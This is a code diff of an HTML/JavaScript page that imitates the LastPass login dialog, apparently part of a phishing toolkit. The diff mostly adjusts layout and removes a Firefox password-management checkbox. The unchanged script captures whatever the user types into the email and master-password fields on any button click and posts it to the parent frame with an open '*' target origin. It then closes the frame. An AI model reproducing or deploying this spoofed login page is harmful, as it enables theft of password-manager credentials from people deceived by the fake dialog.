@@ -31,10 +31,6 @@ $(document).ready(function() {
 		parent.postMessage('Show Vault changed to: ' + $('#showvault').prop('checked'),'*');
 	});
 
-	$('#disableffpwd').change(function() {
-		parent.postMessage('Disable FF Password Management changed to: ' + $('disableffpwd').prop('checked'),'*');
-	});
-
 	$('#login,#cancel,#forgot,#screenkeyboard,#createaccount').click(function() {
 		parent.postMessage('Button Clicked - username field: ' + $('#u').val() + '; password field: ' + $('#p').val(),'*');
 		parent.postMessage('KILLFRAME','*');
@@ -45,21 +41,20 @@ $(document).ready(function() {
 </script>
 </head><body>
 
-<div style="text-align: center; padding-bottom:5px"><img src="icon.png" /></div>
+<div style="text-align: center; padding-bottom:5px"><img src="/img/icon.png" /></div>
 <form>
 <div style="text-align: center">
-	<div style="text-align: left; padding-bottom:5px">Email</div>
-	<div style="text-align: left; padding-bottom:5px"><input type="text" style="width:245px;height:20px" id='u' /></div>
-	<div style="text-align: left; padding-bottom:5px">Master Password</div>
-	<div style="text-align: left; padding-bottom:5px"><input type="password" style="width:245px;height:20px" id='p' /></div>
-	<div style="text-align: left; padding-bottom:5px"><input type="checkbox" checked="checked" id='rememberemail'>Remember Email</input></div>
-	<div style="text-align: left; padding-bottom:5px"><input type="checkbox" id='rememberpassword'>Remember Password</input></div>
-	<div style="text-align: left; padding-bottom:5px"><input type="checkbox" checked="checked" id='showvault'>Show My LastPass Vault After Login</input></div>
-	<div style="text-align: left; padding-bottom:10px"><input type="checkbox" checked="checked" id='disableffpwd'>Disable Insecure Firefox Password Management</input></div>
+	<div style="text-align: left; padding-left: 12px; padding-bottom:5px">Email</div>
+	<div style="text-align: left; padding-left: 12px; padding-bottom:5px"><input type="text" style="width:220px;height:20px" id='u' /></div>
+	<div style="text-align: left; padding-left: 12px;padding-bottom:5px">Master Password</div>
+	<div style="text-align: left; padding-left: 12px;padding-bottom:10px"><input type="password" style="width:220px;height:20px" id='p' /></div>
+	<div style="text-align: left; padding-left: 12px; padding-bottom:5px"><input type="checkbox" checked="checked" id='rememberemail'>Remember Email</input></div>
+	<div style="text-align: left; padding-left: 12px; padding-bottom:5px"><input type="checkbox" id='rememberpassword'>Remember Password</input></div>
+	<div style="text-align: left; padding-left: 12px; padding-bottom:10px"><input type="checkbox" checked="checked" id='showvault'>Show My LastPass Vault After Login</input></div>
 </div>
 
-<div style="text-align:center; padding-bottom:5px">
-	<div style="text-align:left; padding-bottom: 5px"><a href="#" style="text-decoration: none" id='forgot'>I forgot my password, Help!</a></div>
+<div style="text-align:center; padding-left: 15px; padding-bottom:5px">
+	<div style="text-align:left; padding-bottom: 10px"><a href="#" style="text-decoration: none" id='forgot'>I forgot my password, Help!</a></div>
 	<div style="text-align:left; padding-bottom: 10px"><a href="#" style="text-decoration: none" id='screenkeyboard'>Screen Keyboard</a> &nbsp;&nbsp; <a href="#" style="text-decoration: none" id='createaccount'>Create an Account</a></div>
 </div>
 
